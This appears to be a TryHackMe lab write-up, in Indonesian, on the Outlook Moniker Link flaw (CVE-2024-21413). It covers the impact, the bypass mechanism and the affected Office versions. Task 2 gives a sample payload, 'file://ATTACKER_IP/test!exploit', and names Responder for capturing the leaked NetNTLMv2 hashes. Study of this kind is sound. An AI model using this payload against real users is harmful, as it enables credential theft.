# Moniker Link (CVE-2024-21413)

---

*   **Room Link:** [Moniker Link](https://tryhackme.com/r/room/monikerlink)
*   **Category:** Exploitation Basics
*   **Difficulty:** Medium

---

## Task 1: Introduction

Room ini membahas kerentanan kritis pada Microsoft Outlook yang dikenal sebagai **Moniker Link** (CVE-2024-21413).

**Poin Utama:**
*   **CVE-2024-21413:** Ditemukan oleh Check Point Research (Haifei Li), dipublikasikan Februari 2024.
*   **Impact:**
    *   **Bypass Protected View:** Outlook biasanya memblokir link berbahaya atau membukanya di mode aman (Protected View Area), tapi celah ini mem-bypass fitur tersebut.
    *   **Credential Leakage:** Penyerang bisa mencuri kredensial NTLM user (NetNTLMv2 hash).
    *   **RCE (Remote Code Execution):** Potensi eksekusi kode jarak jauh.
*   **Severity:** CVSS 9.8 (Critical).

---

## Task 2: Moniker Link (CVE-2024-21413)

Task ini menjelaskan cara kerja vulnerability Moniker Link.

**1. Konsep Moniker Link**
Outlook menggunakan "Moniker Link" untuk memproses protokol tertentu. Biasanya, protokol `http://` atau `https://` akan membuka browser. Namun, protokol seperti `file://` mencoba mengakses resource lokal atau network share (SMB).

**2. Mekanisme Serangan**
*   **Normal:** Jika kita kirim link `file://ATTACKER_IP/share`, Outlook akan curiga dan menampilkan warning security.
*   **Bypass:** Dengan menambahkan tanda seru (`!`) dan karakter random di belakang ekstensi file, kita bisa menipu Outlook.
    *   *Payload:* `file://ATTACKER_IP/test!exploit`
    *   Outlook gagal memvalidasi link ini sebagai berbahaya dan mencoba mengaksesnya *tanpa* warning dan *tanpa* Protected View.

**3. Dampak (Credential Thef)**
Saat Outlook mencoba mengakses path SMB (`\\ATTACKER_IP\test`), Windows secara otomatis akan mencoba melakukan autentikasi (Single Sign-On).
*   Akibatnya: Windows mengirimkan **NetNTLMv2 Hash** user ke mesin penyerang.
*   Penyerang bisa menangkap hash ini menggunakan tool seperti **Responder**.

**4. Versi Terdampak**
*   Microsoft Office LTSC 2021
*   Office 2019
*   Office 2016
*   Office 365 (Enterprise)
*   (Sudah dipatch per Patch Tuesday Februari 2024)
